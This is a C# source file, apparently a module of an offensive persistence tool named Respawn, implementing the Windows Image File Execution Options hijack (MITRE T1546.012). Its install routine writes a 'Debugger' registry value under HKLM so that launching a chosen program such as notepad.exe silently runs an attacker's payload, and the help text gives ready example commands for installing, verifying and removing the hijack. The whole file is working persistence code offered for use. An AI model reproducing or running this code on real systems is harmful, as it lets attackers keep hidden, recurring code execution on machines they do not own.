using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.IFEO
{
    public class IFEOModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "ifeo";
        public string Name        => "Image File Execution Options";
        public string Mitre       => "T1546.012";
        public string Description => "Persist by abusing the Windows Image File Execution Options (IFEO) registry keys to intercept process execution. By setting a `Debugger` value for a target executable, the Windows Process Loader will silently execute the payload instead of the original program whenever it is launched.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Target process to hijack (e.g. 'notepad.exe')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to debugger executable (.exe only)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t ifeo -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t ifeo -a install -n \"notepad.exe\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t ifeo -a verify  -n \"notepad.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t ifeo -a remove  -n \"notepad.exe\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return IFEOKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening IFEO registry key. Run as administrator.");

                // check if subkey already exists with a debugger set
                using var existing = baseKey.OpenSubKey(ctx.Name);
                if (existing != null && existing.GetValue("Debugger") != null)
                    return TechniqueResult.Exists($"IFEO debugger already set for '{ctx.Name}'.");

                // create subkey named after target process
                using var subKey = baseKey.CreateSubKey(ctx.Name, writable: true);
                if (subKey == null)
                    return TechniqueResult.Fail($"Failed to create IFEO subkey for '{ctx.Name}'.");

                subKey.SetValue("Debugger", ctx.Payload);

                return TechniqueResult.Ok(
                    $"Installed IFEO debugger for '{ctx.Name}' -> '{ctx.Payload}'. " +
                    $"Launching '{ctx.Name}' will now execute payload instead.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. IFEO requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening IFEO registry key. Run as administrator.");

                using var subKey = baseKey.OpenSubKey(ctx.Name, writable: true);
                if (subKey == null)
                    return TechniqueResult.NotFound($"No IFEO entry found for '{ctx.Name}'.");

                if (subKey.GetValue("Debugger") == null)
                    return TechniqueResult.NotFound($"No debugger value set for '{ctx.Name}'.");

                subKey.DeleteValue("Debugger");

                // delete subkey entirely if it has no other values
                if (subKey.ValueCount == 0 && subKey.SubKeyCount == 0)
                {
                    subKey.Close();
                    baseKey.DeleteSubKey(ctx.Name);
                }

                return TechniqueResult.Ok($"Removed IFEO debugger for '{ctx.Name}'.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. IFEO requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied opening IFEO registry key. Run as administrator.");

                using var subKey = baseKey.OpenSubKey(ctx.Name);
                if (subKey == null)
                    return TechniqueResult.NotFound($"No IFEO entry found for '{ctx.Name}'.");

                string? debugger = subKey.GetValue("Debugger")?.ToString();
                if (debugger == null)
                    return TechniqueResult.NotFound($"No debugger value set for '{ctx.Name}'.");

                return TechniqueResult.Ok(
                    $"Verified IFEO debugger for '{ctx.Name}' -> '{debugger}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. IFEO requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No target process specified. Use -n <process.exe> (e.g. notepad.exe).";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                error = "IFEO only supports .exe payloads.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}